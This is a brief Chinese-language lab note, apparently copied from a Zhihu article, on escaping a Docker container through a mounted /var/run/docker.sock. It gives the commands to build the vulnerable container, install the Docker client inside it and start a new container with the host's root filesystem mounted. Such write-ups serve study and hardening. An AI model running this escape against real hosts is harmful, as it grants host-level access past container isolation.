# Mount sock escape
From:https://zhuanlan.zhihu.com/p/614513965
## Description
在启动docker容器时，将宿主机/var/run/docker.sock文件挂载到docker容器中，在docker容器中，也可以操作宿主机的docker。

Docker采用C/S架构，我们平常使用的Docker命令中，docker即为client，Server端的角色由docker daemon扮演，二者之间通信方式有以下3种，使用下面命令，就可以操作目标docker，使用docker命令，操作docker：
```
unix:///var/run/docker.sock
tcp://host:port
fd://socketfd
```

## Usage
搭建漏洞容器
```bash
docker pull ubuntu:16.04
docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu:16.04 /bin/bash
```
在容器中安装docker
```bash
apt-get update
apt-get install docker.io
```
用sock挂载宿主机目录
```bash
docker -H unix://var/run/docker.sock images 
docker -H unix://var/run/docker.sock run -v /:/test -it ubuntu:16.04 /bin/bash
ls /test
```

